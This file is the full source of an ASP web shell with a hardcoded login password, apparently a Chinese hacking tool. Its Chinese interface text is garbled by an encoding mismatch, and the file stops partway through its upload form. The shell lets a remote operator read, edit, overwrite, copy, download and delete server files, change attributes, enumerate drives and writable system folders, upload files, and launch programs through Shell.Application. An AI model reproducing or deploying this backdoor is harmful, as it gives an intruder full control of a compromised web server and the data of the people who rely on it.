<%@ LANGUAGE = VBScript.Encode %>
<HTML>
<HEAD><TITLE>��ҳ����</TITLE>
<STYLE type="text/css">
<!--
BODY{FONT-SIZE: 12px; COLOR: #333333; FONT-FAMILY: "Arial", "Helvetica", "sans-serif";}
TABLE{FONT-SIZE: 12px; COLOR: #333333; LINE-HEIGHT: 16px; FONT-FAMILY: "Arial", "Helvetica", "sans-serif";}
INPUT{BORDER: 1px solid #cccccc; PADDING: 1px; FONT-SIZE: 12px; FONT-FAMILY: ����; HEIGHT: 18px;}
.INPUTt{BORDER-STYLE: none;}
TEXTAREA{BORDER: 1px solid #000000; FONT-SIZE: 12px;FONT-FAMILY: "����"; CURSOR: HAND;}
A:link{COLOR: #32312c; TEXT-DECORATION: none;}
A:visited{COLOR: #32312c; TEXT-DECORATION: none;}
A:hover{COLOR: red; TEXT-DECORATION: none;}
.TBHead{BACKGROUND: #d8f99b; HEIGHT: 28px; TEXT-ALIGN: center; VERTICAL-ALIGN: middle; FONT-WEIGHT: bold;}
.TBEnd{BACKGROUND: #ffffff;HEIGHT:28px;TEXT-ALIGN: center; VERTICAL-ALIGN: middle;}
.TBTD{BACKGROUND:#f7fee9;HEIGHT:25px;}
.TBBO{BORDER-BOTTOM: 1px solid #91d70d;}
-->
</STYLE>
<HEAD>
<BODY leftmargin=0>
<%
Dim Url
Url = Request.ServerVariables("SCRIPT_NAME")
UrlPath = Left(Url,InstrRev(Url,"/"))

Dim oUpFileStream
Class UpFile_Class
Dim Form,File,Version,Err 
Private Sub Class_Terminate  
  If Err < 0 Then
    Form.RemoveAll
    Set Form = Nothing
    File.RemoveAll
    Set File = Nothing
    oUpFileStream.Close
    Set oUpFileStream = Nothing
  End If
End Sub
   
Public Sub GetData ()
  Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
  Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  Dim iFindStart,iFindEnd
  Dim iFormStart,iFormEnd,sFormName
  Set Form = Server.CreateObject ("Scripting.Dictionary")
  Form.CompareMode = 1
  Set File = Server.CreateObject ("Scripting.Dictionary")
  File.CompareMode = 1
  Set tStream = Server.CreateObject ("ADODB.Stream")
  Set oUpFileStream = Server.CreateObject ("ADODB.Stream")
  oUpFileStream.Type = 1
  oUpFileStream.Mode = 3
  oUpFileStream.Open 
  oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
  oUpFileStream.Position = 0
  RequestBinDate = oUpFileStream.Read
  iFormEnd = oUpFileStream.Size
  bCrLf = ChrB (13) & ChrB (10)
  sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
  iStart = LenB  (sSpace)
  iFormStart = iStart+2
  Do
    iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3  
    tStream.Type = 1
    tStream.Mode = 3
    tStream.Open
    oUpFileStream.Position = iFormStart
    oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
    tStream.Position = 0
    tStream.Type = 2
    tStream.CharSet = "gb2312"
    sInfo = tStream.ReadText    
    iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
    iFindStart = InStr (22,sInfo,"name=""",1)+6
    iFindEnd = InStr (iFindStart,sInfo,"""",1)
    sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
    If InStr  (45,sInfo,"filename=""",1) > 0 Then
	    Set oFileInfo = new FileInfo_Class
		iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr (iFindStart,sInfo,"""",1)
		sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
		oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1)
		oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\")+1)
		oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
		iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr (iFindStart,sInfo,vbCr)
		oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
		oFileInfo.FileStart = iInfoEnd
		oFileInfo.FileSize = iFormStart -iInfoEnd -2
		oFileInfo.FormName = sFormName
		file.add sFormName,oFileInfo
	Else
	    tStream.Close
		tStream.Type = 1
		tStream.Mode = 3
		tStream.Open
		oUpFileStream.Position = iInfoEnd
		oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
		tStream.Position = 0
		tStream.Type = 2
		tStream.CharSet = "gb2312"
		sFormValue = tStream.ReadText
		If Form.Exists (sFormName) Then
		    Form (sFormName) = Form (sFormName) & ", " & sFormValue
		Else
		    Form.Add sFormName,sFormValue
		End If
    End If
    tStream.Close
    iFormStart = iFormStart+iStart+2
  Loop Until  (iFormStart+2) = iFormEnd 
  RequestBinDate = ""
  Set tStream = Nothing
End Sub
End Class

Class FileInfo_Class
Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
Public Function SaveToFile (Path)
  On Error Resume Next
  Dim oFileStream
  Set oFileStream = CreateObject ("ADODB.Stream")
  oFileStream.Type = 1
  oFileStream.Mode = 3
  oFileStream.Open
  oUpFileStream.Position = FileStart
  oUpFileStream.CopyTo oFileStream,FileSize
  oFileStream.SaveToFile Path,2
  oFileStream.Close
  Set oFileStream = Nothing 
End Function
 
Public Function FileDate
  oUpFileStream.Position = FileStart
  FileDate = oUpFileStream.Read (FileSize)
End Function
End Class

If Request("Up") = "yes" and Session("DreamX") = "Admin" Then
    UpLoadSave
End if

If Request("Action") = "Login" Then
    If Request.Form("Pass") = "hackjingying." Then '�޸�123456Ϊ�������
	    Session("hackcbu") = "Admin"
	End if
End if

If Session("hackcbu")="Admin" Then
    Select Case Request("Action")
	    Case "Loginout"      : Loginout
	    Case "EditForm"      : EditForm Request("File")
		Case "SaveFile"      : SaveFile
		Case "CopyFile"      : CopyFile
		Case "DownLoad"      : DownLoad Request("File")
		Case "Del"           : Del
		Case "SetAttribForm" : SetAttribForm
		Case "SetAttrib"     : SetAttrib
		Case "ShowServer"    : ShowServer
		Case "ScServer"      : ScServer Request("Servers") 
		Case "CommonObj"     : CommonObj
		Case "ScObj"         : ScObj Request("Objects")
		Case "ScanDriveForm" : ScanDriveForm
		Case "ScanDrive"     : ScanDrive Request("Drive")
		Case "ScFolder"      : ScFolder Request("Folder")
		Case "DispFsoCmdForm": DispFsoCmdForm
		Case "SQLForm"       : SQLForm
		Case "SQL"           : SQL
		Case "UpLoadForm"    : UpLoadForm
		Case else:
		    If Trim(Request("Path")) <> "" then
			    DisplayDirectory Request("Path")
			Else
			    DisplayDirectory Server.MapPath(Left(Url,InstrRev(Url,"/")))
			End if
    End Select
Else
    AdminLogin
	Response.End
End if

Sub AdminLogin()
%>
<P>��</P><P>��</P><P>��</P><P>��</P>
<FORM Action=<%=Url%>?Action=Login method=Post>
<TABLE align=center cellpadding=0 cellspacing=1 width=250 border=0 bgcolor=#91d70d>
  <TR bgcolor=#d8f99b>
    <TD class=TBHead>�����ڱ�</TD>
  </TR>
  <TR>
    <TD class=TBTD>
	  <TABLE width=100% border=0>
	    <TR>
		  <TD width=80 align=middle>Pass</TD>
		  <TD><INPUT type=Password name=Pass size=20></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd><INPUT type=submit value=��¼></TD>
  </TR>
</TABLE>
</FORM>
<%
End Sub

Sub Loginout
    Session.Abandon
	Response.write "<P>��</P><P>��</P><P>��</P><P>��</P>"
	Message "���˳���¼","<LI>�ѳɹ������¼��Ϣ!",0
End Sub

Sub EditForm(filename)
    On Error Resume Next
	Dim FSO,FileStream,FileText
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	Set FileStream = FSO.OpenTextFile(filename,1,False)
	If Not FileStream.AtEndOfStream Then
	    FileText = FileStream.ReadAll
	End If
	FileStream.Close
	Set FileStream = Nothing
	Set FSO = Nothing
%>
<FORM Action=<%=Url%>?Action=SaveFile method=Post>
<TABLE align=center cellspacing=1 cellpadding=3 width=600 border=0 bgColor=#91d70d>
  <TR>
    <TD class=TBHead>�ļ��༭��</TD>
  </TR>
  <TR>
    <TD class=TBTD> �ļ�����
	<INPUT type=text size=35 value="<%=filename%>" name=oPath readonly></TD>
  </TR>
  <TR>
    <TD align=middle class=TBTD>
	<Textarea Name=ChangeTxt Rows=35 cols=105><%=HTMLEncode(FileText)%></TEXTAREA></TD>
  </TR>
  <TR>
    <TD class=TBTD> �ļ�����
	<INPUT type=text size=35 name=nPath>
	<INPUT type=submit value=���Ϊ name=Save>������·�����磺F:\ASP\��F:\ASP\index.asp</TD>
  </TR>
  <TR>
    <TD class=TBEnd>
	<INPUT type=submit value=���� name=Save> <INPUT type=reset value=��ԭ></TD>
  </TR>
</TABLE>
</FORM>

<%
End Sub

Sub SaveFile()
	On Error Resume Next
	Dim nPath,oPath,SaveFso,FileStream
	oPath = Request("oPath")
	Set SaveFso = Server.Createobject("Scripting.FileSystemObject")
	If Request("Save") = "���Ϊ" Then
	    nPath = Request("nPath")
		If Right(nPath,1) = "\" Then nPath = nPath & Mid(oPath,InstrRev(oPath,"\")+1)
		If Right(nPath,1) <> "\" and Instr(nPath,".") = 0 Then nPath = nPath & "\" & Mid(oPath,InstrRev(oPath,"\")+1)
	Else
	    nPath = oPath
	End If
	Set FileStream = SaveFso.CreateTextFile(nPath)
	FileStream.WriteLine Request("ChangeTxt")
	FileStream.Close
	Set SaveFso = Nothing
	If err then
	    err.Clear
        Message "�����ļ�ʧ��","<LI>�������·��" & nPath & "�����ڻ򲻺Ϸ�����Ȩ�ޡ�<LI>�ļ����Կ���Ϊֻ��������NTFSȨ��(�༭�ļ�)��",1
	Else
	    Message "�����ļ��ɹ�","<LI>�ļ��ѳɹ����浽" & nPath ,0
	End If

End Sub

Sub CopyFile()
    On Error Resume Next
    Dim FSO,Source,Target
	Source = Request("oDir")
	Target = Request("nDir")
	Flag = Request("flag")
	Set FSO = Server.CreateObject("Scripting.FileSystemObject")
	If Right(Target,1) <> "\" and Instr(Target,".") = 0 Then Target =  Target & "\"
	If FSO.FolderExists(Left(Target,InstrRev(Target,"\"))) = 0 Then
	    Message "����ʧ��","<LI>Ŀ���ļ��в�����!",0
		Response.End
	End If
	If Flag = 1 Then
	    If FSO.FileExists(Source) Then
		    FSO.CopyFile Source,Target,True
		Else
		    Message "����ʧ��","<LI>Դ�ļ�������!",0
			Response.End
		End If
	Else
	    If FSO.FolderExists(Source) Then
		    FSO.CopyFolder Source,Target,True
		Else
		    Message "����ʧ��","<LI>Դ�ļ��в�����!"
			Response.End
		End If
	End If
	Set FSO = Nothing
	If err then
	    err.Clear
		Message "����ʧ��","<LI>������Ȩ�޲��㣬�޷�����:(",0
	Else
	    Message "���Ƴɹ�","<LI> " & Source & " �Ѹ��Ƶ� " & Target & " ˢ�º�ɼ�!",0
	End if
End Sub

Sub DownLoad(File)
    On Error Resume Next
	Dim FileStream,FSO,FileOb
	Response.Buffer = True
	Response.Clear
	Set FileStream = Server.CreateObject("ADODB.Stream")
	FileStream.Open
	FileStream.Type = 1
    Set FSO = Server.CreateObject("Scripting.FileSystemObject")
    If Not FSO.FileExists(File) Then
	    Message "����ʧ��","<LI>��Ҫ�����ص��ļ�������!",0
		Response.End
    End if
    Set FileOb = FSO.GetFile(File)
        FileLength = FileOb.Size
    FileStream.LoadFromFile(File)
    If err Then
	    Message "����ʧ��","<LI>�޷���ȡ��Ҫ�����ص��ļ�!",0
		Response.End
    End if
    Response.AddHeader "Content-Disposition","Attachment;Filename="&FileOb.name
    Response.AddHeader "Content-Length",Filelength
    Response.CharSet = "UTF-8"
    Response.ContentType = "Application/octet-Stream"
    Response.BinaryWrite FileStream.Read
    Response.Flush
    FileStream.Close
    Set FileStream = Nothing
	Response.End
End Sub

Sub Del
    On Error Resume Next
	Dim Name,Flag
	Name = Request("name")
	Flag = Request("flag")

	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If Flag = 1 Then
	    If FSO.FileExists(name) Then
		    FSO.DeleteFile name,True
		Else
			Message "ɾ��ʧ��","<LI>�ļ�" & name & " �����ڻ���Ȩ��!",0
			Response.End
		End If
	Else
	    If FSO.FolderExists(name) Then
		    FSO.DeleteFolder name,True
		Else
		    Message "ɾ��ʧ��","<LI>�ļ���" & name & "�����ڻ���Ȩ��!",0
			Response.End
		End If
	End If
	Set FSO = Nothing
	If err Then
	    err.Clear
		Message "ɾ��ʧ��","<LI>��Ȩ�޲���� " & name & " ����ʹ�ã��޷�ɾ��!",0
	Else
	    Message "ɾ���ɹ�","<LI>" & name & " ��ɾ��,ˢ�º�ɼ�!",0
	End If

End Sub

Sub SetAttribForm
%>
<FORM action=<%=Url%>?Action=SetAttrib method=Post>
<TABLE align=center cellspacing=1 cellpadding=3 width=480 border=0 bgColor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead>��������</TD></TR>
  <TR class=TBTD>
    <TD width=120 align=middle>�ļ�</TD>
	<TD><INPUT type=text name=name size=38 value="<%=Request("FileFolder")%>"></TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>����</TD>
	<TD>
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=1>ֻ��
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=2>����
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=4>ϵͳ
	  <INPUT class=INPUTt type=checkbox name=noAttrib value=32>��ͨ[������]
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=submit value=�ύ></TD>
  </TR>
</TABLE>
</FORM><BR>

<%
End Sub

Sub SetAttrib
    On Error Resume Next
    Dim FSO,name,GetFileFolder,FileFolderAttrib,noAttrib,Attribs,AttribCount:AttribCount=32
	name = Request("name")
	Set FSO = Server.CreateObject("Scripting.FileSystemObject")
	If FSO.FileExists(name) Then
	    Set GetFileFolder = FSO.GetFile(name)
	ElseIf FSO.FolderExists(name) Then
	    Set GetFileFolder = FSO.GetFolder(name)
	Else
	   Message "��������ʧ��","δ����ָ���ļ���Ŀ¼,��ȷ���ļ���Ŀ¼����.",0
	   Response.End
	End If
	FileFolderAttrib = Request("FileFolderAttrib")
	noAttrib = Request("noAttrib")
	If noAttrib = "" Then
		Attribs = Split(FileFolderAttrib,",")
		For i=0 to Ubound(Attribs)
		    AttribCount = AttribCount+Attribs(i)
		Next
		GetFileFolder.Attributes = AttribCount
	Else
	    GetFileFolder.Attributes = AttribCount
	End If
	If err Then
		err.Clear
		Message "��������ʧ��","��������ʧ��,��ȷ��������Ӧ��Ȩ��.",0
	Else
		Message "�������óɹ�","������" & name & "��" & GetAttrib(AttribCount) ,0
	End If
	Set GetFileFolder = Nothing
	Set FSO = Nothing
End Sub

Sub ShowServer
    Message "��ǰ��������Ϣ", "<LI>�������˿ڣ�" & Red(Request.Servervariables("SERVER_PORT")) & "<LI>������CPU������" & Red(Request.ServerVariables("NUMBER_OF_PROCESSORS") & "��") & "<LI>����������ϵͳ��" & Red(Request.ServerVariables("OS")) & "<LI>��������:" & Red(Request.Servervariables("SERVER_NAME")) & "<LI>������IP��" & Red(Request.Servervariables("LOCAL_ADDR")) & "<LI>��������ǰʱ�䣺" & Red(Now()) & "<LI>���ļ�����·����" & Red(Request.ServerVariables("PATH_TRANSLATED")),0
	%>
	<DIV width=450 align=center>
	  <FORM action=<%=Url%>?Action=ScServer method=Post>������Ϣ��ѯ��
	    <INPUT type=text name=Servers>
		<INPUT type=submit value=��ѯ>������Servervariable���Ϲؼ���
	  </FORM>
	</DIV>
	<%
End Sub

Function Red(str)
    Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Sub ScServer(var)
    On Error Resume Next
	Dim Temp_Str
	Temp_Str = Request.ServerVariables(var)
	If Temp_Str = "" Then
		Message "��������Ϣ","<LI>��ѯ("&var&")����ֵ��" & Red("�ؼ��ִ���򷵻�ֵΪ��!</FONT>"),1
	Else
	    Message "��������Ϣ","<LI>��ѯ("&var&")����ֵ��" & Red(Temp_Str),1
	End If
End Sub

Sub CommonObj() '�����������
	Message "��ǰ�����Ϣ","<LI>FSO�ı���д:" & GetObj("Scripting.FileSystemObject") & "<LI>���ݿ�ʹ�ã�" & GetObj("ADODB.Connection") &	"<LI>FileUp�ϴ������" & GetObj("FileUp.upload") & "<LI>Jmail���֧�֣�" & GetObj("JMail.SMtPMail") & "<LI>CDONTS���֧�֣�" & GetObj("CDONTS.NewMail") &	"<LI>DOS����֧��(Wscript.shell):" & GetObj("Wscript.shell"),0
	%>
	<DIV width=450 align=center>
	  <FORM action=<%=Url%>?Action=ScObj method=Post>���������ѯ��
	    <INPUT type=text name=Objects>
		<INPUT type=submit value=��ѯ>�������������.��:Wscript.shell
	  </FORM>
	</DIV>
	<%
End Sub

Function GetObj(obj)  
    On Error Resume Next
    Dim Object
	Set Object = Server.CreateObject(obj)
	If IsObject(Object) then
	    GetObj = Red("��")
	Else
	    GetObj = Red("��")
	End If
	Set Object = Nothing
End Function

Sub ScObj(obj)
	Message "�����Ϣ","<LI>���������(" & obj & ")��" & GetObj(obj),1
End Sub

Sub ScanDriveForm() 'ɨ�������Ϣ
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	
%>
<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>
  <TR>
    <TD colspan=5 class=TBHead>����/ϵͳ�ļ�����Ϣ</TD>
  </TR>
  <%
  For Each DriveB in FSO.Drives%>
  <TR align=middle class=TBTD>
    <FORM action=<%=Url%>?Action=ScanDrive&Drive=<%=DriveB.DriveLetter%> method=Post>
	<TD width=25%><B>�̷�</B></TD>
	<TD width=15%><%=DriveB.DriveLetter%>:</TD>
	<TD width=20%><B>����</B></TD>
	<TD width=20%>
	<%
	  Select Case DriveB.DriveType
	      Case 1: Response.write "���ƶ�"
		  Case 2: Response.write "����Ӳ��"
		  Case 3: Response.write "�������"
		  Case 4: Response.write "CD-ROM"
		  Case 5: Response.write "RAM����"
		  Case else: Response.write "δ֪����"
	  End Select
	%>
	</TD>
	<TD><INPUT type=submit value=��ϸ����></TD>
	</FORM>
  </TR>
  <%
  Next%>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=ScFolder&Folder=<%=FSO.GetSpecialFolder(0)%> method=Post>		  
	<TD align=middle><B>Windows�ļ���</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(0)%></TD>
	<TD align=middle><INPUT type=submit value=��ϸ����></TD>
	</FORM>
  </TR>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=ScFolder&Folder=<%=FSO.GetSpecialFolder(1)%> method=Post>		  
	<TD align=middle><B>System32�ļ���</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(1)%></TD>
	<TD align=middle><INPUT type=submit value=��ϸ����></TD>
	</FORM>
  </TR>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=ScFolder&Folder=<%=FSO.GetSpecialFolder(2)%> method=Post>		  
	<TD align=middle><B>ϵͳ��ʱ�ļ���</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(2)%></TD>
	<TD align=middle><INPUT type=submit value=��ϸ����></TD>
	</FORM>
  </TR>
</TABLE><BR>
<DIV align=center>
  <FORM Action=<%=Url%>?Action=ScFolder method=Post>ָ���ļ��в�ѯ��
    <INPUT type=text name=Folder>
	<INPUT type=submit value=���ɱ���>��ָ���ļ���·�����磺F:\ASP\
  </FORM>
<DIV>
<%
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive) 'ɨ��ָ������
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scripting.FileSystemObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>���̷������ͣ�" & Red(TestDrive.FileSystem) & "<LI>�������кţ�" & Red(TestDrive.SerialNumber) & "<LI>���̹�������" & Red(TestDrive.ShareName) & "<LI>������������" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>���̾�����" & Red(TestDrive.VolumeName) & "<LI>���̸�Ŀ¼:" & ScReWr((Drive & ":\"))

			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>�ļ��У�" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>���̸�Ŀ¼:" & Red("���ɶ�:(")
			Dim TempFolderList,t:t=0
			Temp_Str = Temp_Str & "<LI>" & Red("���Ŀ¼���ԣ�")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>�����ļ��У�" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>�����" & Drive & "�̸�Ŀ¼����δ�з���:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<LI>ע�⣺" & Red("��Ҫ���ˢ�±�ҳ�棬������ֻд�ļ��л����´��������ļ�!")
		Message Drive & ":������Ϣ",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
    On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>ָ���ļ��и�Ŀ¼��" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>�ļ��У�" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>�ļ��У�" & Red(folder & "�����ڻ��޶�Ȩ��!")
	End if
	Scmsg = Scmsg & "<LI>ע�⣺" & Red("��Ҫ���ˢ�±�ҳ�棬������ֻд�ļ��л����´��������ļ�!")
	Set FSO = Nothing
	Message "�ļ�����Ϣ",Scmsg,1
End Sub

Function ScReWr(folder)   '1.�ɶ�,����д��2.���ɶ�,��д��3.�ɶ�,��д��4.���ɶ�,����д��
   On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scripting.FileSystemObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & "<FONT color=#ff2222> ���ɶ�,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "����д��</FONT>"
	   Else
	       ReWrStr = ReWrStr & "��д��</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & "<FONT color=#ff2222> �ɶ�,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "����д��</FONT>"
	   Else
	       ReWrStr = ReWrStr & "��д��</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function

Sub DispFsoCmdForm
%>

<FORM Action=<%=Url%>?Action=DispFsoCmdForm method=Post>
<TABLE width=580 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead>��FSO����</TD>
  </TR>
  <TR class=TBTD>
    <TD colspan=2>��ע�����1.Ŀ�ĵ�ַ������.�磺F:\APS\��2.���г����ܼ������</TD>
  </TR>
  <TR class=TBTD>
    <TD width=80 align=middle>Ŀ¼���</TD>
	<TD>
	  <INPUT type=text name=Sf value=<%=Request("Sf")%>>
	  <INPUT class=INPUTt type=radio value=Abs name=SelectPath 
	  <%If Request("SelectPath")="Abs" or Request("SelectPath") = "" Then%>checked<%End If%>>����
	  <INPUT class=INPUTt type=radio value=Ote name=SelectPath 
	  <%If Request("SelectPath")="Ote" Then%>checked<%End If%>>���</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>�ļ�����</TD>
	<TD>
	  <INPUT type=text name=Cs value=<%=Request("Cs")%>> ��
	  <INPUT type=text name=Ct value=<%=Request("Ct")%>>��Ŀ�ĵ�ַֻ��ΪĿ¼��</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>�ļ��ƶ�</TD>
	<TD>
	  <INPUT type=text name=Ms value=<%=Request("Ms")%>> ��
	  <INPUT type=text name=Mt value=<%=Request("Mt")%>>��Ŀ�ĵ�ַֻ��ΪĿ¼��</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>���г���</TD>
	<TD>
	  <INPUT type=text name=PerFolder value=<%=Request("PerFolder")%>> ��
	  <INPUT type=text name=PerFile value=<%=Request("PerFile")%>>��·��:��������</TD>
  </TR>
  <TR>
    <TD colspan=2 class=TBEnd>
	  <INPUT type=hidden value=yes name=CMDok><INPUT type=submit value=��������></TD>
  </TR>
  <%
  If Request("CMDok") = "yes" Then%>
  <TR bgColor=#ffffff>
    <TD align=center colspan=4><DIV align=center><Textarea Rows=22 cols=90><%DispFsoCmd%></Textarea></DIV></TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=button value=�ر� onclick="window.close();"></TD>
  </TR>
  <%
  End if%>
</TABLE>
</FORM>

<%
End Sub	
	
Sub DispFsoCmd
    On Error Resume Next
    Dim Sf,Cs,Ct,Ms,Mt,PerFolder,PerFile
	
		Sf = Trim(Request("Sf"))
		Cs = Trim(Request("Cs"))
		Ct = Trim(Request("Ct"))
		Ms = Trim(Request("Ms"))
		Mt = Trim(Request("Mt"))
		PerFolder = Trim(Request("PerFolder"))
		PerFile = Trim(Request("PerFile"))

		Set Shell = Server.Createobject("Shell.Application")
	    If Sf <> "" Then
		    Dim ShowSpace,ShowFiles,File
			If Request("SelectPath")="Ote" Then Sf = Server.MapPath(Sf)
			Set ShowSpace = Shell.NameSpace(Sf)
			Set ShowFiles = ShowSpace.Items
			For Each File in ShowFiles
			     Response.write File.Path & "     " & File.Size & "     " & File.Type & vbCrLf
			Next
		End If

		If Cs <> "" and Ct <> "" Then
			Dim Cs_Folder,Cs_File,Cs_Space,Cs_FilePar,Ct_Space
			Set Ct_Space = Shell.NameSpace(Ct)
			Cs_Folder = Left(Cs,instrRev(Cs,"\"))
			Cs_File = Right(Cs,Len(Cs)-InstrRev(Cs,"\"))
			Set Cs_Space = Shell.NameSpace(Cs_Folder)
			Set Cs_FilePar = Cs_Space.Parsename(Cs_File)
			Ct_Space.CopyHere Cs_FilePar
			If err Then
			    err.Clear
				Response.write "�������󣬸����ļ�ʧ�ܡ�"
			Else
			    Response.write "�Ѹ���         1 ���ļ���"
			End if
		End if

		If Ms <> "" and Mt <> "" Then
		    Dim Ms_Folder,Ms_File,Ms_Space,Ms_FilePar,Mt_Space
			Set Mt_Space = Shell.NameSpace(Mt)
			Ms_Folder = Left(Ms,instrRev(Ms,"\"))
			Ms_File = Mid(Ms,InstrRev(Ms,"\")+1)
			Set Ms_Space = Shell.NameSpace(Ms_Folder)
			Set Ms_FilePar = Ms_Space.Parsename(Ms_File)
			Mt_Space.MoveHere Ms_FilePar
			if err Then
			    err.Clear
				Response.write "���������ƶ��ļ�ʧ�ܡ�"
			Else
			    Response.write "���ƶ�         1 ���ļ���"
			End if
		End if

		If PerFolder <> "" and PerFile <> "" Then
			Shell.Namespace(PerFolder).Items.Item(PerFile).InvoKeverb
			If err Then
			    err.Clear
				Response.write "�������󣬳���ִ��ʧ�ܡ�"
			Else
			    Response.write "�ѳɹ�ִ��" & PerFile & "����"
			End If
		End If
End Sub

Sub Message(state,msg,flag)
%>

<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>
  <TR>
    <TD class=TBHead>ϵͳ��Ϣ</TD>
  </TR>
  <TR>
    <TD align=middle bgcolor=#ecfccd>
	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>
	    <TR>
		  <TD><FONT color=red><%=state%></FONT></TD>
		<TR>
		  <TD><P><%=msg%></P></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd>
	<%If flag=0 Then%>
	      <INPUT type=button value=�ر� onclick="window.close();">
	<%Else%>
	      <INPUT type=button value=���� onClick="history.go(-1);">
	<%End if%>
	</TD>
  </TR>
</TABLE>

<%
End Sub

Sub UpLoadForm
    Dim num
	num = Trim(Request("num"))
	If Not isNumeric(num) or num="" Then num=1
%>
<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead><B>�ļ��ϴ�</B></TD>
  </TR>
  <TR class=TBTD>
    <FORM action=<%=Url%>?Action=UpLoadForm method=Post>
	<TD align=middle width=120>�ϴ��ļ�����</TD>
	<TD>
	  <INPUT type=text name=num size=5>
	  <INPUT type=submit value=�ύ>
	</TD>
	</FORM>
  </TR>
  <FORM action=<%=Url%>?Up=yes method=Post enctype=multipart/form-data>
  <TR class=TBTD>
    <TD align=middle>��������������Ŀ¼</TD>
	<TD><INPUT type=text name=ServerPath></TD>
  </TR>
  <%
  For i=1 to num%>
  <TR class=TBTD>
    <TD align=middle>�ļ�<%=i%></TD>
